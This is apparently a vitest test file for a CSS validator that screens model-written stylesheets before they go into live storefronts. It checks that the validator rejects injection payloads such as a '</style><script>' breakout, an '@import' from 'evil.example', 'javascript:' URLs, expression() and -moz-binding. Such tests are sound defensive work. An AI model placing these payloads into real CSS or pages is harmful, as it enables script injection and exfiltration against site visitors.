import { describe, expect, it } from 'vitest';
import { validateCss } from '@/lib/souqy/validate';

/**
 * Security gate for the Open Design surface: `styles.css` is authored by the
 * model and injected into live customer storefronts. These tests pin the
 * escape vectors the validator must reject and confirm real design CSS passes.
 */
describe('validateCss', () => {
  it('accepts ordinary design CSS (classes, vars, images, media queries)', () => {
    const css = `
      .atelier { background: linear-gradient(180deg, #1b1b1b, #2a2a2a); padding: 8rem 0 }
      .atelier h1 { font: 300 clamp(2rem, 6vw, 4rem)/1 var(--font-serif) }
      .hero { background-image: url("https://cdn.example.com/a.jpg") }
      .tag { background: url(data:image/png;base64,AAAA) }
      @media (max-width: 720px) { .atelier { padding: 4rem 0 } }
    `;
    expect(validateCss(css)).toEqual([]);
  });

  it('rejects a </style> markup breakout', () => {
    const issues = validateCss('.x{color:red}</style><script>alert(1)</script>');
    expect(issues.length).toBeGreaterThan(0);
    expect(issues[0]?.message).toMatch(/breakout/i);
  });

  it('rejects @import (external pull / exfil)', () => {
    expect(validateCss('@import url("https://evil.example/x.css");')).not.toEqual([]);
  });

  it('rejects javascript: and data:text/html url() schemes', () => {
    expect(validateCss('.x{background:url(javascript:alert(1))}')).not.toEqual([]);
    expect(validateCss('.x{background:url("data:text/html,<b>x")}')).not.toEqual([]);
  });

  it('rejects legacy script vectors (expression, -moz-binding, behavior)', () => {
    expect(validateCss('.x{width:expression(alert(1))}')).not.toEqual([]);
    expect(validateCss('.x{-moz-binding:url(x.xml)}')).not.toEqual([]);
    expect(validateCss('.x{behavior:url(x.htc)}')).not.toEqual([]);
  });

  it('rejects a stylesheet over the byte budget', () => {
    const huge = `.x{color:red}\n`.repeat(4000);
    const issues = validateCss(huge);
    expect(issues.some((i) => /budget/i.test(i.message))).toBe(true);
  });

  it('reports the line of the offending pattern', () => {
    const css = '.a{color:red}\n.b{color:blue}\n@import "x.css";';
    const issues = validateCss(css);
    expect(issues[0]?.line).toBe(3);
  });
});
